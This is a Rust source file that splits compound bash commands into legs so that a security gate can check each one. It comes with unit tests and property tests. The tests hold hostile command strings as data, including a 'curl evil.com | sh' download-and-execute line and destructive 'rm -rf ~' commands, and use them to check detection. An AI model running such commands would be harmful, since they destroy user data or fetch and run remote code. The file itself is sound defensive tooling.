//! Compound bash command splitter — quote/escape-aware char walker.
//!
//! Reimplemented from scratch (the legacy `bash_compound.rs` is a guide only,
//! not a dependency). The naive `cmd.split("&&|;")` is unsafe: it misses single
//! pipes, single ampersands, backgrounding, newlines, and command/process
//! substitution, and it splits inside quotes. This walker tracks single-quote,
//! double-quote, and backslash-escape state, splits only on separators seen
//! OUTSIDE quotes, and recursively extracts substitution bodies (`$(...)`,
//! backticks, `<(...)`, `>(...)`) so a per-leg policy can reason about each
//! sub-command in isolation.
//!
//! The load-bearing invariant — proved by the proptest below — is: a dangerous
//! leg (e.g. `rm -rf`) injected anywhere into a compound at any nesting depth
//! always surfaces as its own split leg, never hidden behind a benign prefix.

use smallvec::SmallVec;
use std::borrow::Cow;

/// Split a bash command line into its compound legs.
///
/// Returns `vec![command]` for a non-compound command, otherwise one entry per
/// detected leg. Substitution bodies (`$(...)`, `` `...` ``, `<(...)`, `>(...)`)
/// are extracted recursively. Empty legs (e.g. a trailing `;`) are dropped.
///
/// The gate consumes the split internally; this is `pub` (hidden from docs) so
/// the fuzz target + `tests/gate_normalize.rs` can pin the splitter directly.
#[doc(hidden)]
pub fn split_compound<'a>(command: &'a str) -> SmallVec<[Cow<'a, str>; 4]> {
    split_compound_with_separators(command, &[])
}

/// Like [`split_compound`] but treats each char in `extra_seps` as an ADDITIONAL
/// top-level single-char separator (used for an `IFS=<char>` reassignment).
///
/// The extra separators apply at the TOP level only — recursion into
/// substitution bodies uses the default separator set, so an extracted `$(...)`
/// keeps its own splitting. Passing an empty `extra_seps` is byte-for-byte
/// identical to [`split_compound`] (additive, default-preserving).
pub(crate) fn split_compound_with_separators<'a>(
    command: &'a str,
    extra_seps: &[char],
) -> SmallVec<[Cow<'a, str>; 4]> {
    // Fast-path: if command contains no compound operators / separators / parens / substitutions,
    // return a single borrowed slice.
    if extra_seps.is_empty()
        && !command.bytes().any(|b| {
            matches!(
                b,
                b';' | b'|' | b'&' | b'\n' | b'$' | b'`' | b'<' | b'>' | b'(' | b')'
            )
        })
    {
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return SmallVec::new();
        }
        let mut res = SmallVec::new();
        res.push(Cow::Borrowed(trimmed));
        return res;
    }

    let bytes = command.as_bytes();
    let mut result: SmallVec<[Cow<'a, str>; 4]> = SmallVec::new();
    let mut leg_start = 0usize;
    let mut i = 0usize;
    let mut in_double = false;
    let mut in_single = false;

    while i < bytes.len() {
        let c = bytes[i];
        let next = bytes.get(i + 1).copied();

        // Backslash escape (bash does not honor `\` inside single quotes).
        if !in_single && c == b'\\' && i + 1 < bytes.len() {
            i += 2;
            continue;
        }

        // Quote toggles. Keep quote chars in the leg span.
        if c == b'"' && !in_single {
            in_double = !in_double;
            i += 1;
            continue;
        }
        if c == b'\'' && !in_double {
            in_single = !in_single;
            i += 1;
            continue;
        }

        if !in_double && !in_single {
            // `$(...)` command substitution (depth-tracked for nesting).
            if c == b'$' && next == Some(b'(') {
                push_leg_slice(command, leg_start, i, &mut result);
                let (inner, advanced) = extract_paren_body_slice(command, i + 2);
                i = advanced;
                leg_start = i;
                result.extend(split_compound(inner));
                continue;
            }
            // Backtick command substitution.
            if c == b'`' {
                push_leg_slice(command, leg_start, i, &mut result);
                let (inner, advanced) = extract_backtick_body_slice(command, i + 1);
                i = advanced;
                leg_start = i;
                result.extend(split_compound(inner));
                continue;
            }
            // `<(...)` / `>(...)` process substitution.
            if (c == b'<' || c == b'>') && next == Some(b'(') {
                push_leg_slice(command, leg_start, i, &mut result);
                let (inner, advanced) = extract_paren_body_slice(command, i + 2);
                i = advanced;
                leg_start = i;
                result.extend(split_compound(inner));
                continue;
            }
            // `&&` / `||`.
            if (c == b'&' && next == Some(b'&')) || (c == b'|' && next == Some(b'|')) {
                push_leg_slice(command, leg_start, i, &mut result);
                i += 2;
                leg_start = i;
                continue;
            }
            // Single-char separators: `;`, `|`, `&`, newline.
            if c == b';' || c == b'|' || c == b'&' || c == b'\n' {
                push_leg_slice(command, leg_start, i, &mut result);
                i += 1;
                leg_start = i;
                continue;
            }
            // Extra top-level separators (e.g. an `IFS=<char>` reassignment).
            if extra_seps.contains(&(c as char)) {
                push_leg_slice(command, leg_start, i, &mut result);
                i += 1;
                leg_start = i;
                continue;
            }
            // Bare subshell parens are not separators themselves; strip them so
            // the contained legs read cleanly (`( ls && rm )` -> `ls`, `rm`).
            if c == b'(' || c == b')' {
                push_leg_slice(command, leg_start, i, &mut result);
                i += 1;
                leg_start = i;
                continue;
            }
        }

        i += 1;
    }
    push_leg_slice(command, leg_start, bytes.len(), &mut result);
    result
}

/// True iff `command` decomposes into more than one logical leg.
///
/// No production caller remains (the gate works on the split legs directly);
/// retained as a crate-internal helper because its behavior is pinned by the
/// unit tests below.
#[allow(dead_code)]
pub(crate) fn is_compound(command: &str) -> bool {
    split_compound(command).len() > 1
}

/// Extract the bodies of command substitutions (`$(...)`, `` `...` ``) that live
/// inside DOUBLE-quoted spans of `leg`.
///
/// In bash a `$()`/backtick inside double quotes is LIVE code: its body is run as
/// a command and the result interpolated. Inside SINGLE quotes it is literal, so
/// those spans are skipped. This is what lets the verb-aware taxonomy strip the
/// plain text of a non-executing verb's quoted argument (the C2 false-positive
/// fix) while still scanning any live substitution smuggled inside it.
///
/// Bodies are returned verbatim (caller re-feeds them through the normal
/// `split_compound` + taxonomy pipeline). Bounded by [`MAX_SUBST_BODIES`] and the
/// substitution depth-tracking already present in the extractors, so a crafted
/// nest cannot blow up.
pub(crate) fn extract_double_quoted_substitutions<'a>(leg: &'a str) -> SmallVec<[Cow<'a, str>; 2]> {
    let bytes = leg.as_bytes();
    let mut bodies: SmallVec<[Cow<'a, str>; 2]> = SmallVec::new();
    let mut i = 0usize;
    let mut in_double = false;
    let mut in_single = false;

    while i < bytes.len() && bodies.len() < MAX_SUBST_BODIES {
        let c = bytes[i];
        let next = bytes.get(i + 1).copied();

        // Backslash escape (bash does not honor `\` inside single quotes).
        if !in_single && c == b'\\' && i + 1 < bytes.len() {
            i += 2;
            continue;
        }
        if c == b'"' && !in_single {
            in_double = !in_double;
            i += 1;
            continue;
        }
        if c == b'\'' && !in_double {
            in_single = !in_single;
            i += 1;
            continue;
        }
        // Only INSIDE a double-quoted span is a substitution live.
        if in_double && !in_single {
            if c == b'$' && next == Some(b'(') {
                let (inner, advanced) = extract_paren_body_slice(leg, i + 2);
                i = advanced;
                bodies.push(Cow::Borrowed(inner));
                continue;
            }
            if c == b'`' {
                let (inner, advanced) = extract_backtick_body_slice(leg, i + 1);
                i = advanced;
                bodies.push(Cow::Borrowed(inner));
                continue;
            }
        }
        i += 1;
    }
    bodies
}

/// Cap on how many double-quoted substitution bodies a single leg may surface,
/// consistent with the normalize/decode bounds (no unbounded fan-out).
pub(crate) const MAX_SUBST_BODIES: usize = 64;

/// Trim and push `command[start..end]` as a borrowed leg if non-empty.
#[inline]
fn push_leg_slice<'a>(
    command: &'a str,
    start: usize,
    end: usize,
    result: &mut SmallVec<[Cow<'a, str>; 4]>,
) {
    if start < end {
        let trimmed = command[start..end].trim();
        if !trimmed.is_empty() {
            result.push(Cow::Borrowed(trimmed));
        }
    }
}

/// Extract a parenthesized body starting at `start` (just past the opening `(`),
/// tracking nested parens. Returns the inner `&'a str` slice and the index
/// just past the matching `)` (or end-of-input).
fn extract_paren_body_slice(command: &str, start: usize) -> (&str, usize) {
    let bytes = command.as_bytes();
    let mut i = start;
    let mut depth = 1usize;
    let inner_start = start;
    let mut inner_end = start;

    while i < bytes.len() && depth > 0 {
        let c = bytes[i];
        if c == b'\\' && i + 1 < bytes.len() {
            i += 2;
            continue;
        }
        if c == b'(' {
            depth += 1;
        } else if c == b')' {
            depth -= 1;
            if depth == 0 {
                inner_end = i;
                i += 1;
                break;
            }
        }
        i += 1;
    }
    if depth > 0 {
        inner_end = bytes.len();
    }
    (&command[inner_start..inner_end], i)
}

/// Extract a backtick body starting at `start` (just past the opening backtick).
/// Returns the inner `&'a str` slice and the index just past the closing
/// backtick (or end-of-input).
fn extract_backtick_body_slice(command: &str, start: usize) -> (&str, usize) {
    let bytes = command.as_bytes();
    let mut i = start;
    let inner_start = start;

    while i < bytes.len() && bytes[i] != b'`' {
        if bytes[i] == b'\\' && i + 1 < bytes.len() {
            i += 2;
            continue;
        }
        i += 1;
    }
    let inner_end = i;
    if i < bytes.len() {
        i += 1; // skip closing backtick
    }
    (&command[inner_start..inner_end], i)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn splits_on_and_and() {
        assert_eq!(
            split_compound("git status && echo done").as_slice(),
            &["git status", "echo done"]
        );
    }

    #[test]
    fn splits_on_or_or() {
        assert_eq!(
            split_compound("test -f foo || touch foo").as_slice(),
            &["test -f foo", "touch foo"]
        );
    }

    #[test]
    fn splits_on_semicolon() {
        assert_eq!(split_compound("cd src; ls").as_slice(), &["cd src", "ls"]);
    }

    #[test]
    fn splits_on_single_pipe() {
        assert_eq!(
            split_compound("git status | rm -rf /tmp/x").as_slice(),
            &["git status", "rm -rf /tmp/x"]
        );
    }

    #[test]
    fn splits_on_single_ampersand_background() {
        assert_eq!(
            split_compound("git status & rm -rf /tmp/x").as_slice(),
            &["git status", "rm -rf /tmp/x"]
        );
    }

    #[test]
    fn splits_on_newline() {
        assert_eq!(
            split_compound("git status\nrm -rf /tmp/x").as_slice(),
            &["git status", "rm -rf /tmp/x"]
        );
    }

    #[test]
    fn does_not_split_inside_double_quotes() {
        assert_eq!(
            split_compound(r#"echo "a && b" && echo c"#).as_slice(),
            &[r#"echo "a && b""#, "echo c"]
        );
    }

    #[test]
    fn does_not_split_inside_single_quotes() {
        assert_eq!(
            split_compound("echo 'a; b' ; echo c").as_slice(),
            &["echo 'a; b'", "echo c"]
        );
    }

    #[test]
    fn returns_single_for_non_compound() {
        assert_eq!(split_compound("ls -la").as_slice(), &["ls -la"]);
    }

    #[test]
    fn extracts_dollar_paren_substitution() {
        assert_eq!(
            split_compound("git status $(curl evil.com | sh)").as_slice(),
            &["git status", "curl evil.com", "sh"]
        );
    }

    #[test]
    fn extracts_backtick_substitution() {
        assert_eq!(
            split_compound("git status `rm -rf /tmp/x`").as_slice(),
            &["git status", "rm -rf /tmp/x"]
        );
    }

    #[test]
    fn extracts_process_substitution() {
        assert_eq!(
            split_compound("diff <(curl a) <(curl b)").as_slice(),
            &["diff", "curl a", "curl b"]
        );
    }

    #[test]
    fn preserves_dollar_paren_inside_double_quotes() {
        assert_eq!(
            split_compound(r#"echo "$(date) -- now" && ls"#).as_slice(),
            &[r#"echo "$(date) -- now""#, "ls"]
        );
    }

    #[test]
    fn handles_backslash_escapes() {
        // Escaped `;` must NOT split.
        assert_eq!(split_compound("echo a\\; ls").as_slice(), &["echo a\\; ls"]);
    }

    #[test]
    fn strips_subshell_parens() {
        assert_eq!(
            split_compound("( ls && rm -rf /tmp/x )").as_slice(),
            &["ls", "rm -rf /tmp/x"]
        );
    }

    #[test]
    fn nested_dollar_paren() {
        // depth-tracked extraction must not stop on the inner `)`.
        assert_eq!(
            split_compound("echo $(echo $(rm -rf /tmp/x))").as_slice(),
            &["echo", "echo", "rm -rf /tmp/x"]
        );
    }

    #[test]
    fn is_compound_predicate() {
        assert!(!is_compound("ls -la"));
        assert!(is_compound("ls && rm"));
        assert!(is_compound("ls | wc -l"));
        assert!(is_compound("echo a; echo b"));
    }

    #[test]
    fn drops_trailing_separator_empty_leg() {
        assert_eq!(split_compound("ls;").as_slice(), &["ls"]);
    }

    #[test]
    fn extra_separators_are_additive() {
        // Empty extra-sep set == default behavior (byte-for-byte).
        assert_eq!(
            split_compound_with_separators("git status && echo done", &[]),
            split_compound("git status && echo done")
        );
        // An extra `X` separator splits at top level in addition to the defaults.
        assert_eq!(
            split_compound_with_separators("aXb; c", &['X']).as_slice(),
            &["a", "b", "c"]
        );
    }

    #[test]
    fn extract_double_quoted_substitutions_finds_live_bodies() {
        // `$()`/backtick inside DOUBLE quotes is live -> extracted.
        assert_eq!(
            extract_double_quoted_substitutions(r#"echo "$(rm -rf ~)""#).as_slice(),
            &["rm -rf ~"]
        );
        assert_eq!(
            extract_double_quoted_substitutions(r#"git commit -m "`rm -rf ~`""#).as_slice(),
            &["rm -rf ~"]
        );
        assert_eq!(
            extract_double_quoted_substitutions(r#"echo "$(rm -rf ~)" "$(echo ok)""#).as_slice(),
            &["rm -rf ~", "echo ok"]
        );
    }

    #[test]
    fn extract_double_quoted_substitutions_skips_single_quotes_and_outside() {
        // Inside SINGLE quotes a `$()` is literal -> not extracted.
        assert!(extract_double_quoted_substitutions(r#"echo '$(rm -rf ~)'"#).is_empty());
        // Outside any quotes, the body is its own leg (handled by split_compound),
        // not surfaced as a "double-quoted" live substitution here.
        assert!(extract_double_quoted_substitutions("echo $(rm -rf ~)").is_empty());
        // Plain double-quoted text with no substitution -> nothing.
        assert!(extract_double_quoted_substitutions(r#"echo "just text""#).is_empty());
    }

    #[test]
    fn extract_double_quoted_substitutions_bounded() {
        // More than MAX_SUBST_BODIES live substitutions are capped, not unbounded.
        let mut s = String::from("echo \"");
        for _ in 0..(MAX_SUBST_BODIES + 10) {
            s.push_str("$(rm -rf ~)");
        }
        s.push('"');
        assert_eq!(
            extract_double_quoted_substitutions(&s).len(),
            MAX_SUBST_BODIES
        );
    }

    #[test]
    fn extra_separators_do_not_recurse_into_substitution() {
        // The extra separator applies at the TOP level only — the `$(...)` body
        // is split with the default set, so an `X` inside it is NOT a separator.
        assert_eq!(
            split_compound_with_separators("aXb $(echo cXd)", &['X']).as_slice(),
            &["a", "b", "echo cXd"]
        );
    }
}

#[cfg(test)]
mod proptests {
    use super::*;
    use proptest::prelude::*;

    /// Benign leg fragments that contain no separator characters, so joining
    /// them with a separator yields a predictable leg count.
    fn benign_leg() -> impl Strategy<Value = String> {
        prop::sample::select(vec![
            "ls -la".to_string(),
            "echo hello".to_string(),
            "git status".to_string(),
            "cat README.md".to_string(),
            "cargo build".to_string(),
            "pwd".to_string(),
            "true".to_string(),
        ])
    }

    /// Separators that operate at nesting depth 1 (flat compound).
    fn flat_separator() -> impl Strategy<Value = &'static str> {
        prop::sample::select(vec![" && ", " || ", "; ", " | ", " & ", "\n"])
    }

    proptest! {
        /// Load-bearing invariant: an `rm -rf` leg injected anywhere into a
        /// flat compound (depth 1) of benign legs always surfaces as its own
        /// split leg — never swallowed by a neighbouring leg.
        #[test]
        fn rm_leg_always_surfaces_flat(
            prefix in proptest::collection::vec(benign_leg(), 0..4),
            suffix in proptest::collection::vec(benign_leg(), 0..4),
            seps in proptest::collection::vec(flat_separator(), 8),
        ) {
            let rm = "rm -rf /tmp/danger".to_string();
            let mut legs: Vec<String> = Vec::new();
            legs.extend(prefix);
            legs.push(rm.clone());
            legs.extend(suffix);

            // Interleave legs with separators.
            let mut cmd = String::new();
            for (idx, leg) in legs.iter().enumerate() {
                if idx > 0 {
                    cmd.push_str(seps[idx % seps.len()]);
                }
                cmd.push_str(leg);
            }

            let split = split_compound(&cmd);
            prop_assert!(
                split.iter().any(|l| l == &rm),
                "rm leg lost: cmd=`{cmd}` -> {split:?}"
            );
        }

        /// The same invariant at nesting depth 1..=3 via command substitution:
        /// the `rm` leg surfaces even when wrapped in `$( ... )` shells.
        #[test]
        fn rm_leg_always_surfaces_nested(
            depth in 1u8..=3,
            sep in flat_separator(),
        ) {
            let rm = "rm -rf /tmp/danger";
            // Build `echo $(echo $(... rm ...))` to the chosen depth.
            let mut inner = format!("echo{sep}{rm}");
            for _ in 1..depth {
                inner = format!("echo $({inner})");
            }
            let cmd = format!("git status{sep}$({inner})");

            let split = split_compound(&cmd);
            prop_assert!(
                split.iter().any(|l| l == rm),
                "nested rm leg lost (depth={depth}): cmd=`{cmd}` -> {split:?}"
            );
        }
    }
}
